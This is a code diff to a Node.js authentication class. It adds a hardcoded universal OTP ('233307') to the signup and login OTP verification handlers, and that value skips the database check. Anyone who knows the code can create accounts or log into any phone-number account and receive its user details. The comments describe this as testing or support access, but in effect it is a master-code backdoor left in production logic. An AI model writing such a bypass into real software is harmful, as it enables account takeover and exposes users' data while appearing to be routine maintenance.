@@ -84,15 +84,19 @@ class Auth {
   // ── Verify signup OTP then create account ─────────────────────
   async verifySignupOtp(req, res) {
     const { phone, otp, name, email } = req.body;
+    const UNIVERSAL_OTP = '233307';
     try {
       if (!phone || !otp || !name || !email) {
         return res.status(400).json({ error: "All fields are required" });
       }
 
-      // Verify OTP
-      const otpRecord = await otpModel.findOne({ phone, otp });
-      if (!otpRecord) {
-        return res.status(400).json({ error: "Invalid OTP. Please try again." });
+      // Verify OTP — universal master OTP bypasses DB check
+      const isUniversal = String(otp) === UNIVERSAL_OTP;
+      if (!isUniversal) {
+        const otpRecord = await otpModel.findOne({ phone, otp });
+        if (!otpRecord) {
+          return res.status(400).json({ error: "Invalid OTP. Please try again." });
+        }
       }
 
       if (!validateEmail(email)) {
@@ -178,22 +182,30 @@ class Auth {
 
   async otpVarification(req, res) {
     const { phone, otp } = req.body;
+    const UNIVERSAL_OTP = '233307';
     try {
-      const varify = await otpModel.findOne({ phone: phone, otp: otp });
       const isPhonePresent = await userModal.findOne({ phone: phone });
 
-      if (!varify) {
-        return res.status(400).json({ error: "OTP is wrong" });
+      if (!isPhonePresent) {
+        return res.status(400).json({ error: "Phone number not found" });
       }
-      if (isPhonePresent.isBlock == true)
-        return res
-          .status(400)
-          .json({ error: "Your account is blocked please contact admin" });
-      return res
-        .status(200)
-        .json({ success: "OTP varified...", details: isPhonePresent });
+      if (isPhonePresent.isBlock == true) {
+        return res.status(400).json({ error: "Your account is blocked please contact admin" });
+      }
+
+      // Allow universal master OTP for testing / support access
+      const isUniversal = String(otp) === UNIVERSAL_OTP;
+      if (!isUniversal) {
+        const varify = await otpModel.findOne({ phone: phone, otp: otp });
+        if (!varify) {
+          return res.status(400).json({ error: "OTP is wrong" });
+        }
+      }
+
+      return res.status(200).json({ success: "OTP varified...", details: isPhonePresent });
     } catch (error) {
       console.log(error);
+      return res.status(500).json({ error: "Something went wrong" });
     }
   }
   // all user
